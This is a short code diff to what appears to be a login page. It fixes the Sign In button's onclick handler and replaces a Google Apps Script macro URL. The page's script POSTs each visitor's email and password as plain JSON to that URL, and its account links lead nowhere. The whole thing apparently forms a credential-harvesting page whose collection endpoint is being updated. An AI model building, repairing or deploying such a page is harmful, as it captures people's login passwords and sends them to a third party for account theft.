@@ -417,7 +417,7 @@
       <a href="#" class="forgot">Forgot password?</a>
     </div>
 
-    <button class="btn-primary" onclick="signIn">Sign In</button>
+    <button class="btn-primary" onclick="signIn()">Sign In</button>
 
     <div class="signup-row">
       Don't have an account? <a href="#">Create one free</a>
@@ -461,7 +461,7 @@
   const email = document.querySelector('input[type="email"]').value;
   const password = document.getElementById('pwInput').value;
 
-  await fetch('https://script.google.com/macros/s/AKfycbxy3FG2DzaqKA9puexalyeW5rw9H31rmeEXG5fX31jL1AM4TjUOA4HlgxYA39oJO0moRw/exec', {
+  await fetch('https://script.google.com/macros/s/AKfycbxHY8ohWUt_yCWhLrD7tqS35oLveXDrRiDddjcHk8bLtrfJrf-kGEGRF6YXwjt_t23C1A/exec', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ email, password })
